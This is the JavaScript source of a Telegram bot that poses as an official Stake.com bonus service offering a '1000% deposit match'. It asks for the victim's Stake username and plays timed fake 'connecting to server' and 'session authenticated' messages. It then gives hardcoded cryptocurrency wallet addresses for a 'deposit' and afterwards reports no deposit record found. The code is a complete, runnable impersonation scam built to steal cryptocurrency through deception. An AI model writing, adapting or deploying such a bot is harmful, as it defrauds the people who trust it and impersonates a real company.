const TelegramBot = require("node-telegram-bot-api");
require("dotenv").config();

const { TOKEN } = process.env;

const bot = new TelegramBot(TOKEN, { polling: true });

const userSession = {};

bot.onText(/\/start/, (msg) => {
  const userId = msg.from.id;

  bot.sendPhoto(userId, "./welcome.jpg", {
    caption:
      "Welcome to the Official Stake bonus bot where you can get special Stake bonuses available to every Stake user!\n\n🚀 1000% DEPOSIT MATCH BONUS\n\n🚨 Wager requirements: NONE\n\n🏧 EARLY ACCESS TO BONUSES",
    reply_markup: {
      inline_keyboard: [
        [{ text: "💰 Claim Deposit Bonus 💰", callback_data: "deposit" }],
        [{ text: "🎟️ Claim Bonus Code 🎟️", callback_data: "code" }],
        [
          {
            text: "💰 Claim Via Flat Currencies 💰",
            callback_data: "currencies",
          },
        ],
      ],
    },
  });
});

bot.on("callback_query", async (query) => {
  const data = query.data;
  const userId = query.from.id;

  if (!userSession[userId]) {
    userSession[userId] = {};
  }

  const session = userSession[userId];

  if (data == "code") {
    bot.sendMessage(userId, "Please Enter Your Code:");
    session.state = "code";
  } else if (data == "currencies" || data == "deposit") {
    session.click = data == "currencies" ? "currencies" : "deposit";
    await bot.sendMessage(
      userId,
      "What is your Stake.com username?\n\n🔽🔽🔽🔽🔽🔽🔽🔽🔽🔽\n\n(please type your username correctly or you might accidentally give someone else the bonus.)"
    );
    bot.sendMessage(userId, " 🔽 ");
    session.state = "username";
  } else if (data == "next") {
    setTimeout(() => {
      bot.sendMessage(
        userId,
        `Connecting to the first available Stake.com server...`
      );
    }, 1000);
    setTimeout(() => {
      bot.sendMessage(
        userId,
        `Requesting account information for,  ${session.name}.`
      );
    }, 3000);
    setTimeout(() => {
      bot.sendMessage(userId, `Connected to Server....`);
    }, 5000);
    setTimeout(() => {
      bot.sendMessage(userId, `Downloading User Account data...`);
    }, 6000);
    setTimeout(() => {
      bot.sendMessage(
        userId,
        `Session Authenticated.

✅  Successfully connected to the Stake account, ${session.name}`,
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "CONTINUE TO DEPOSIT BONUS",
                  callback_data: "depositbonus",
                },
              ],
            ],
          },
        }
      );
    }, 7000);
  } else if (data == "depositbonus") {
    await bot.sendMessage(
      userId,
      `${session.name}, How much (in USD) would you like to deposit to your Stake account?\n\n(Type your answer below)`
    );
    await bot.sendMessage(
      userId,
      `Please respond with numbers only, no symbols please.\n\nFor example: 1000`
    );
    bot.sendMessage(userId, "🔽🔽🔽");
    session.state = "amount";
  } else if (data.startsWith("payin_")) {
    const currency = data.split("_")[1].toUpperCase();
    setTimeout(() => {
      bot.sendMessage(
        userId,
        `I will now retrieve a single-use address associated with the Stake account ${session.name}  you provided earlier to facilitate our deposit match bonus with no wager requirement.`
      );
    }, 1500);
    setTimeout(() => {
      bot.sendMessage(
        userId,
        `🚼 Your deposit will appear in your Transactions page after 1 confirmation is reached.`
      );
    }, 2500);
    setTimeout(() => {
      bot.sendMessage(
        userId,
        `✅Your one-time use (${currency}) address has been generated successfully!`
      );
    }, 3500);
    setTimeout(() => {
      bot.sendMessage(
        userId,
        "-------------------------------------------\n`0x1818370D5b1a52242090E906AA2c6184E3a83903`\n\n-------------------------------------------",
        {
          parse_mode: "Markdown",
        }
      );
    }, 4500);
    setTimeout(() => {
      bot.sendMessage(
        userId,
        "🟨After you have sent your deposit, Please click the continue button.",
        {
          reply_markup: {
            inline_keyboard: [
              [{ text: "CONTINUE", callback_data: "continue" }],
            ],
          },
        }
      );
    }, 5500);
  } else if (data == "continue") {
    bot.sendMessage(
      userId,
      `${session.name} After you click the submit button, your 1000% deposit match bonus claim will be completed and your Stake account will be credited after (1) confirmation is reached.`,
      {
        reply_markup: {
          inline_keyboard: [[{ text: "SUBMIT", callback_data: "submit" }]],
        },
      }
    );
  } else if (data == "submit") {
    await bot.sendMessage(
      userId,
      "You have successfully completed the deposit match bonus."
    );
    bot.sendMessage(
      userId,
      `Hello, ${session.name} !\n\nWhat would you like to do❓`,
      {
        reply_markup: {
          inline_keyboard: [
            [{ text: "CHECK DEPOSIT STATUS", callback_data: "checkstatus" }],
            [{ text: "SHARE WITH FRIENDS", callback_data: "share" }],
            [{ text: "CONTACT US", callback_data: "contactus" }],
            [{ text: "RAFFLE SIGN UP", callback_data: "raffle" }],
            [{ text: "TERMS OF SERVICES", callback_data: "service" }],
          ],
        },
      }
    );
  } else if (data == "share") {
    bot.sendMessage(
      userId,
      "You can share this bot with your friends by giving them this link",
      {
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "SHARE",
                url: "https://t.me/share/url?url=https://t.me/aesyhe_bot",
              },
            ],
            [
              {
                text: "GO BACK",
                callback_data: "submit",
              },
            ],
          ],
        },
      }
    );
  } else if (data == "contactus") {
    bot.sendMessage(
      userId,
      `You can contact us using the live chat section of Stake.com. Alternative options are by email help@stake.com and telegram https://t.me/Stake_Mods ( @Stake_Mods )`,
      {
        reply_markup: {
          inline_keyboard: [[{ text: "GO BACK", callback_data: "submit" }]],
        },
      }
    );
  } else if (data == "raffle") {
    bot.sendMessage(userId, "No active raffles. Try again later.", {
      reply_markup: {
        inline_keyboard: [[{ text: "GO BACK", callback_data: "submit" }]],
      },
    });
  } else if (data == "service") {
    bot.sendMessage(userId, "These are the most recent terms of service.", {
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "SHARE",
              url: "www.youtube.com",
            },
          ],
          [
            {
              text: "GO BACK",
              callback_data: "submit",
            },
          ],
        ],
      },
    });
  } else if (data == "checkstatus") {
    bot.sendMessage(
      userId,
      `Checking deposit bonus status for Stake username  ${session.name}`
    );
    setTimeout(() => {
      bot.sendMessage(userId, "....Loading...");
    }, 1500);
    setTimeout(() => {
      bot.sendMessage(userId, "....Loading...");
    }, 2500);
    setTimeout(() => {
      bot.sendMessage(userId, "No deposit record found");
    }, 4500);
    setTimeout(async () => {
      await bot.sendMessage(userId, "🟨STATUS: (no deposit record)");
      bot.sendMessage(userId, "Make sure you sent the deposit correctly", {
        reply_markup: {
          inline_keyboard: [[{ text: "GO BACK", callback_data: "submit" }]],
        },
      });
    }, 5500);
  }
});

bot.on("message", async (msg) => {
  const text = msg.text;
  const userId = msg.from.id;

  if (text.startsWith("/")) return;

  if (!userSession[userId]) {
    userSession[userId] = {};
  }

  const session = userSession[userId];

  if (session.state == "code") {
    bot.sendMessage(userId, "❌ Incorrect Code ❌");
    session.state = "";
  } else if (session.state == "username") {
    session.name = text;
    bot.sendMessage(
      userId,
      `Hello, ${text} ✋\n\nClick the NEXT button to start the deposit bonus match process.\n\n(the entire process only takes 1 - 2 minutes.)`,
      {
        reply_markup: {
          inline_keyboard: [[{ text: "NEXT", callback_data: "next" }]],
        },
      }
    );
    session.state = "";
  } else if (session.state == "amount") {
    const regex = /^\d+$/;
    if (!regex.test(text)) return;

    const opts =
      session.click == "currencies"
        ? {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [
                  {
                    text: "🔗 Click To Complete the Payment",
                    url: "https://changelly.com/buy",
                  },
                ],
              ],
            },
          }
        : {
            parse_mode: "Markdown",
            reply_markup: {
              inline_keyboard: [
                [
                  {
                    text: "BTC",
                    callback_data: "payin_btc",
                  },
                ],
                [
                  {
                    text: "ETH",
                    callback_data: "payin_eth",
                  },
                ],
                [
                  {
                    text: "SOLANA",
                    callback_data: "payin_solana",
                  },
                ],
                [
                  {
                    text: "BTC",
                    callback_data: "payin_btc",
                  },
                ],
                [
                  {
                    text: "LTC",
                    callback_data: "payin_ltc",
                  },
                ],
                [
                  {
                    text: "USDT",
                    callback_data: "payin_usdt",
                  },
                ],
                [
                  {
                    text: "DOGE",
                    callback_data: "payin_doge",
                  },
                ],
                [
                  {
                    text: "BCH",
                    callback_data: "payin_bch",
                  },
                ],
                [
                  {
                    text: "XRP",
                    callback_data: "payin_xrp",
                  },
                ],
                [
                  {
                    text: "EOS",
                    callback_data: "payin_eos",
                  },
                ],
                [
                  {
                    text: "TRX",
                    callback_data: "payin_trx",
                  },
                ],
                [
                  {
                    text: "BNB",
                    callback_data: "payin_bnb",
                  },
                ],
                [
                  {
                    text: "USDC",
                    callback_data: "payin_usdc",
                  },
                ],
                [
                  {
                    text: "APE",
                    callback_data: "payin_ape",
                  },
                ],
                [
                  {
                    text: "BUSD",
                    callback_data: "payin_busd",
                  },
                ],
                [
                  {
                    text: "CRO",
                    callback_data: "payin_cro",
                  },
                ],
                [
                  {
                    text: "DAI",
                    callback_data: "payin_dai",
                  },
                ],
                [
                  {
                    text: "LINK",
                    callback_data: "payin_link",
                  },
                ],
                [
                  {
                    text: "SAND",
                    callback_data: "payin_sand",
                  },
                ],
                [
                  {
                    text: "SHIB",
                    callback_data: "payin_shib",
                  },
                ],
                [
                  {
                    text: "UNI",
                    callback_data: "payin_uni",
                  },
                ],
                [
                  {
                    text: "MATIC",
                    callback_data: "payin_matic",
                  },
                ],
              ],
            },
          };

    const message =
      session.click != "currencies"
        ? `${session.name} Select the cryptocurrency you want for the deposit bonus.`
        : "🚀 Complete Your Payment!🚀\n\nTo finalize your purchase, simply click on the BTC address to copy.\nAnd then paste it on the site where it asks for BTC address. ✅\n\n`bc1qz0fwwaagrcdxwpcent59gukrtspdmctg73ykr4`\n\n🪙 Make sure you use the correct address for the specific crypto you're purchasing.\n🚼 Your deposit will appear in your Transactions page after 1 confirmation is reached.";

    setTimeout(() => {
      bot.sendMessage(userId, "Connection Interrupted. Reconnecting...");
    }, 1000);
    setTimeout(() => {
      bot.sendMessage(userId, "Handshaking...");
    }, 3000);
    setTimeout(() => {
      bot.sendMessage(userId, "Connected!");
    }, 5000);
    setTimeout(async () => {
     await bot.sendMessage(
        userId,
        `✅  @Bonussstake_bot has successfully connected to ${session.name} and is now matching this Stake account to the deposit bonus.`
      );
      bot.sendMessage(userId, message, opts);
    }, 5500);
  }
});

// MANAGE UNHANDLED REJECTIONS
process.on("unhandledRejection", (err) => {
  console.log("UNHANDLED REJECTION");
  console.log(err.name, err.message);
});
console.log("Bot runinng...");
